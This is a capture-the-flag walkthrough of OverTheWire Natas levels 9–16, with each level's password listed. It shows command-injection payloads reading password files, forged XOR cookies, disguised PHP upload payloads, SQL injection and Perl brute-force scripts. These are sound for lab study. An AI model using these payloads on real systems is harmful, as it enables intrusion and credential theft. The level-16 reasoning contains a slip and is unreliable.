## 9 needle in a haystack - nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu

View the source to see it uses the input to set variable $key and issue this command:

```
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
```

It's sort of like sql injection, if you post this: `foo /dev/null; cat /etc/natas_webpass/natas9; wc -l` you get it to write the contents of /etc/natas_webpass/natas9 and you get the flag

## 10 filtered needle on a haystack - U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK

Same as before, but now they got a little smarter on linting the input:

```php
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}
?>
```

We can use dashes though, so just post this to bypass the linting: `-e ".*" /etc/natas_webpass/natas11`

## 11 In da Crib -

Key to solving this challenge is knowing that XOR crypts are vulnerable to KPA (Known Plaintext Attacks), such that:

plaintext XOR key = crypt_A
plaintext XOR crypt_A = key

Which is how we get the key that can be used to decrypt some other crypt_B.

Code shows it saves the cookie as such:

```php
function saveData($d) {
    setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
}
```

And the cookie value is: ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw%3D

(I think the %3D in the end is an `=` html encoded)

The initial saved data is `$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");`

So we might suppose that, in plaintext, this would be saved as `{"showpassword":"no","bgcolor":"#ffffff"}` (after being json_encoded).

Since it stores it base64 encoded as well, we need to first base64 decode the cookie value, but it yields something strange:

```
~ echo ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw= | base64 -d | hexdump -C
00000000  0a 55 4b 22 1e 00 48 2b  02 04 4f 25 03 13 1a 70  |.UK"..H+..O%...p|
00000010  53 19 57 68 5d 55 5a 2d  12 18 54 25 03 55 02 68  |S.Wh]UZ-..T%.U.h|
00000020  52 11 5e 2c 17 11 5e 68  0c                       |R.^,..^h.|
00000029
```

with lots of non ASCII characters, so I decided to try getting the result as plain hex:

```
~ echo ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw= | base64 -d | xxd -p
0a554b221e00482b02044f2503131a70531957685d555a2d121854250355
026852115e2c17115e680c
```

So now, we have the plaintext: `{"showpassword":"no","bgcolor":"#ffffff"}` and the XORed hex `0a554b221e00482b02044f2503131a70531957685d555a2d121854250355
026852115e2c17115e680c`

So, the key should be derived from doing plaintext XOR cypheredtext, by using their very same code.

```php
<?php

$cookie = "ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=";
$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");

function xor_encrypt($in, $key) {
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

echo xor_encrypt(json_encode($defaultdata), base64_decode($cookie));
?>
```

```
~ php -f xor-breaker.php
qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jq
```

The repetitions are because of the convolution, but the key itself is the unique part, so: `qw8J`.

Now we need to use this key to generate the fake cookie that will get us to change the value of showpassword.

```php
$payload = array( "showpassword"=>"yes", "bgcolor"=>"#ffffff");

echo base64_encode( xor_encrypt(json_encode($payload), "qw8J"));
echo "\n";
```

```
~ php -f xor-breaker.php
ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK
```

Using this value as the new cookie and refreshing the page:

```
The password for natas12 is EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3
```

## 12 jPHPeg - jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY

In this challenge we are presented with an image upload form and again a view source link. By following the view source we can see that it does a bunch of useless stuff and eventually it does:

```php
echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
```

So, our main objective is to upload a php script that will echo the `/etc/natas_webpass/natas13` file for us.

```php
<html>
<body>
<?php
echo file_get_contents("/etc/natas_webpass/natas13")
?>
</body>
</html>
```

By first trying to upload a simple .jpeg image, we get, as expected:

> The file upload/rn0ydnnuad.jpg has been uploaded

And clicking the link loads up the `rn0ydnnuad.jpg` image. This filename is set by a hidden form field, so in order to get the file to be created with a .php extension, we will need to craft the request such that we can change the filename of the hidden field.

By using Firefox's "edit and resend" (which is most like a simplified burp suite) I was able to edit the filename into `foobar.php`, which ended up uploading the file as `upload/nseef0aqii.php` and requesting this path on the browser got me the flag: jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY.

## 13 Magic Number - Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1

This is the same as **12** but this time their code runs a verification on the file to check if it is an image.

```php
if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
  echo "File is not an image";
}
```

By googling you will find that `exif_imagetype` simply reads the 4 first bytes of the file, a.k.a. the **Magic Number** to confirm if it's an image or not.

That said, all we need to do is to create a malicious payload that contains the 4 first bytes mimicking that of a legit image.

```php
'\xFF\xD8\xFF\xE0' + '<? echo file_get_contents("/etc/natas_webpass/natas14"); ?>'
```

Let's do it with perl, just for the kicks.

```perl
perl -e 'open(fh, ">", "/tmp/natas14.php"); print fh "\xFF\xD8\xFF\xE0" . "<? echo file_get_contents(\"/etc/natas_webpass/natas14\"); ?>"; close(fh)'
```

And voila, works like a charm, we got the payload implanted.

```
For security reasons, we now only accept image files!

The file upload/o8grhpz1hw.php has been uploaded
```

## 14 sqli - AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J

So this is a textbook bobby tables scenario (sql injection).

A form with username and password that is fed directly into a query. 

This time I want to take sometime to play around with some kali tools that probe for sqli in websites.

### Skipfish

Skipfish is a webcrawler that hunts for vulnerabilities. Running it against natas14, unsurprisingly, yielded 2 **High risk** findings (it attempted sqli once for each the username and password fields) for Query Injection Vector. The trace of which is below:

```
=== REQUEST ===

POST /index.php HTTP/1.1
Host: natas14.natas.labs.overthewire.org
Accept-Encoding: gzip
Connection: keep-alive
Range: bytes=0-399999
Authorization: Basic bmF0YXMxNDpMZzk2TTEwVGRmYVB5VkJrSmRqeW1ibGxRNUw2cWRsMQ==
User-Agent: sfish'"
Referer: sfish'"
Accept-Language: sfish'",en
Content-Type: application/x-www-form-urlencoded
Content-Length: 34

username=Smith&password=skipfish'"
=== RESPONSE ===

HTTP/1.1 200 Partial Content
Date: Sun, 29 Mar 2020 22:02:52 GMT
Server: Apache/2.4.10 (Debian)
Vary: Accept-Encoding
Content-Encoding: gzip
Content-Range: bytes 0-488/489
Content-Length: 489
Keep-Alive: timeout=5, max=89
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas14", "pass": "Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1" };</script></head>
<body>
<h1>natas14</h1>
<div id="content">
<br />
<b>Warning</b>:  mysql_num_rows() expects parameter 1 to be resource, boolean given in <b>/var/www/natas/natas14/index.php</b> on line <b>24</b><br />
Access denied!<br><div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>

=== END OF DATA ===
```

If this was more of a real scenario, it would have crawled up to 16 nested levels and attempted several probes (for varied types of vulnerabilities).

### pwning natas14

Anyways, let's move on and get done with this.

```php
$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
```

so, if we pass in a username such as `bobbytables" or 1 = 1; -- ` it will yield the following query:

```sql
SELECT * from users where username="bobbytables" or 1 = 1; -- " and password="foo"
```

Pay attention to include a whitespace in the end after the `--`.

This breaks it and gets the flag:

```
Successful login! The password for natas15 is AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J
```

## 15 Bruteforcing sqli - WaIHEacj63wnNIBROHeqi3p9t0m5nhmh

This is another sql injection vuln, but in this case we will need to bruteforce it into giving us the desired result.

When looking at the source for this challenge, it shows us the table structure.

```sql
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
```

The subject query is:

```php
$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
```

We can craft the username in such way that this is queried:

```sql
SELECT * from users where username="natas16" and password like "a%"
```

And if that does not work, we go to:

```sql
SELECT * from users where username="natas16" and password like "b%"
```

And so on until we get an affirmative response.... of course doing this manually is not manegeable, so we will create a script to automate that... in perl 🤟.

```perl
#!/usr/bin/perl
use strict;
use warnings;
use v5.10;
use LWP::UserAgent;
use HTTP::Request::Common;

my $url = 'http://natas15.natas.labs.overthewire.org/index.php';
my $ua = LWP::UserAgent->new();

my $flag_found = 0;
my $flag = '';
my @possible_characters = split('', '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ');

while (!$flag_found) {
	for(my $char_index = 0; $char_index < @possible_characters; $char_index++) {
		my $char = $possible_characters[$char_index];
		my $temp_flag = $flag . $char;
		print "Attempting $temp_flag\n";
		my $payload = "natas16\" and password like binary \"$temp_flag%";

		my $request = POST $url, Content => [ username => $payload ];

		$request->authorization_basic('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J');

		my $response = $ua->request($request);
		if ($response->as_string() =~ /This user exists/i) {
			$flag .= $char;
			print "Got part of flag as $flag                   \n";
			last;
		}
	}

	if (length($flag) == 32) {
		$flag_found = 1;
	}
}

say $flag;
```

After a few minutes of bruteforcing, we get:

```
WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
```

## 16 First nightmare - 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw

This is similar to previous challenges, but with extra character filters and now they wrap `$key` in double quotes.

```php
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&`\'"]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i \"$key\" dictionary.txt");
    }
}
```

If we send `.*" /etc/natas_webpass/natas17 "foo` we get:

```bash
grep -i ".*" /etc/natas_webpass/natas17 "foo" dictionary.txt
```

NOPE, we can't send double quotes...

Ok, so I cheated a bit and saw that this is another case for bruteforcing and the idea is to think in reverse: try and get the grep not to match when you actually match something.

So, since we can pass `$` and `()`, we can run commands inside that other grep like so:

```php
$key = "$(grep ^a /etc/natas_webpass/natas17)"
```

It turns the executed command into:

```bash
grep -i "$(grep ^a /etc/natas_webpass/natas17)"elephant dictionary.txt
```

If `/etc/natas_webpass/natas17` matches `/^a/` then the resulting command will be:

```bash
grep -i "aelephant" dictionary.txt
```

And if it does not begin with an `a` then it will not match, will be empty and the command will be

```bash
grep -i "aelephant" dictionary.txt
```

Which we know will match cause we know:

1. `elephant` is on the dictionary.
2. `alephant` is not.

So, to the batmobile!

```perl
#!/usr/bin/perl

use strict;
use warnings;
use v5.10;
use LWP::UserAgent;
use HTTP::Request::Common;

my $url = 'http://natas16.natas.labs.overthewire.org/index.php';
my $ua = LWP::UserAgent->new();


my $flag_found = 0;
my $flag = '';
my @possible_characters = split('', '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ');

while (!$flag_found) {
	for(my $char_index = 0; $char_index < @possible_characters; $char_index++) {
		my $char = $possible_characters[$char_index];
		my $temp_flag = $flag . $char;
		my $payload = "\$(grep ^$temp_flag /etc/natas_webpass/natas17)elephant";

		print "Attempting $temp_flag\n";

		my $request = POST $url, Content => [ needle =>  $payload ];
		 
		$request->authorization_basic('natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh');
		 
		my $response = $ua->request($request);
		if ($response->as_string() !~ /elephant/i) {
			$flag .= $char;
			print "Got part of flag as $flag                   \n";
			last;
		}
	}

	if (length($flag) == 32) {
		$flag_found = 1;
	}
}

say $flag;
```

Alas, the flag is: 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw